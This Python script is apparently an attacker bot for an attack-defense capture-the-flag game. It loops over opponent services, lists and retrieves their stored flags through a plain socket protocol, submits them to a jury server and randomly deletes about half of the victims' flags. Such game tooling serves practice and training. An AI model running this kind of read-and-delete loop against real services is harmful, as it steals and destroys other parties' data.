#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import socket
import time
import sys
import random
import traceback

def send_flag(your_teamnum, jury_hostport, flag):
    global requests
    url = 'http://' + jury_hostport + '/flag?teamid=' + str(your_teamnum) + '&flag=' + flag
    try:
        r = requests.get(url)
        print("Try send flag " + flag)
        if r.status_code != 200:
            print("FAIL")
            print(r.text)
        else:
            print("OK!!!!")
    except Exception as ex:
        print("Could not connect to jury " + url + str(ex))
    except SystemExit:
        pass

def delete_flag(ip_address, port, flag_id):
    try:
        # print("try connect " + host + ":" + str(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip_address, port))
        s.recv(1024)
        s.send("delete\n".encode("utf-8"))
        s.recv(1024)
        s.send((flag_id + "\n").encode("utf-8"))
        s.recv(1024)
        s.close()
    except socket.timeout:
        print("Error(1) in delete_flag socket.timeout")
        traceback.print_exc()
        exit(509)
    except socket.error as serr:
        print("Error(2) in delete_flag " + str(serr))
        traceback.print_exc()
        exit(508)
    except Exception as e:
        print("Error(3) in delete_flag " + str(e))
        traceback.print_exc()
        exit(507)
    return ''

def get_flag(ip_address, port, flag_id):
    try:
        # print("try connect " + host + ":" + str(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip_address, port))
        s.recv(1024)
        s.send("get\n".encode("utf-8"))
        s.recv(1024)
        s.send((flag_id + "\n").encode("utf-8"))
        result = s.recv(1024)
        result = result.decode("utf-8", "ignore")
        flag2 = result.strip()
        flag2 = flag2.split("FOUND FLAG: ")
        if len(flag2) == 2:
            flag2 = flag2[1]
        else:
            flag2 = ''
        s.close()
        return flag2
    except socket.timeout:
        print("Error(1) in get_flag socket.timeout")
        traceback.print_exc()
        exit(500)
    except socket.error as serr:
        print("Error(2) in get_flag " + str(serr))
        traceback.print_exc()
        exit(501)
    except Exception as e:
        print("Error(3) in get_flag " + str(e))
        traceback.print_exc()
        exit(502)
    return ''


def start_attack(your_teamnum, jury_hostport, ip_address, port):
    print("Start attack to (" + ip_address + ":" + str(port) + ")")
    flag_ids = []

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip_address, port))
        s.recv(1024)
        s.send("list\n".encode("utf-8"))
        result = ""
        result1 = s.recv(1024)
        result1 = result1.decode("utf-8", "ignore")
        while result1.strip() != "":
            result1 = s.recv(1024)
            result1 = result1.decode("utf-8", "ignore")
            if result1.strip() == "":
                break
            result = result + result1
        s.close()

        result = result.split('\n')
        for i in result:
            flag_id = i.split(":")
            if len(flag_id) > 1:
                flag_id = flag_id[1].strip()
                flag_ids.append(flag_id)
    except socket.timeout:
        print("Socket timeout")
        traceback.print_exc()
        exit(504)
    except socket.error as serr:
        print("Error in start_attack: " + str(serr))
        traceback.print_exc()
        exit(505)
    except Exception as e:
        print("Error in start_attack: " + str(e))
        traceback.print_exc()
        exit(506)

    for flag_id in flag_ids:
        flag = get_flag(ip_address, port, flag_id)
        print(flag_id + ": " + flag)
        if flag != '':
            send_flag(your_teamnum, jury_hostport, flag)
            # random remove flag
            n = random.randint(1,100)
            if n < 50:
                delete_flag(ip_address, port, flag_id)

    # flag = str(uuid.uuid4())
    # send_flag(your_teamnum, jury_host, jury_port, flag)


jury_hostport = sys.argv[1]
your_teamnum = sys.argv[2]
attack_hosts = sys.argv[3]

attack_hosts = attack_hosts.split(",")
print(attack_hosts)

while(True):
    print(" =============== ")
    for hostport in attack_hosts:
        victum_host = hostport.split(":")[0]
        victum_port = int(hostport.split(":")[1])
        start_attack(your_teamnum, jury_hostport, victum_host, victum_port)
        print(hostport)
    t = random.randint(1,60)
    print("wait " + str(t) + " sec")
    time.sleep(t) # wait t seconds before attack